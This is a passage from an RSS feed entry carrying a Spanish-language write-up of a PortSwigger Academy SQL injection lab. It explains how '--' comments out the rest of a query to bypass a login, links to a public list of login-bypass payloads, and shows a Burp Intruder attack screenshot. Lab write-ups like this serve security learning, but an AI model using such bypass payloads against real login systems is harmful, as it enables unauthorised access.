&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Haciendo que despues de &lt;code&gt;--&lt;/code&gt; se comente lo que le sigue y solo se ejecute lo primero. Adicionalmente no existe solo ese payload, se puede hacer uso de otros como la siguiente &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Y por el tamano de la salida nos podemos dar cuenta que arroja muchos datos, aunque un payload no sea aceptado se puede hacer uso de otros.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 653px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder.png&#34; data-size=&#34;765x281&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder.png&#34;
			width=&#34;765&#34;
			height=&#34;281&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder_hu2ccd66ec86f3df3c4bd2dbac1bdd383f_13343_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-1/intruder_hu2ccd66ec86f3df3c4bd2dbac1bdd383f_13343_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass2.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista&lt;/a&gt; de payloads bypass login&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        
    </channel>
</rss>
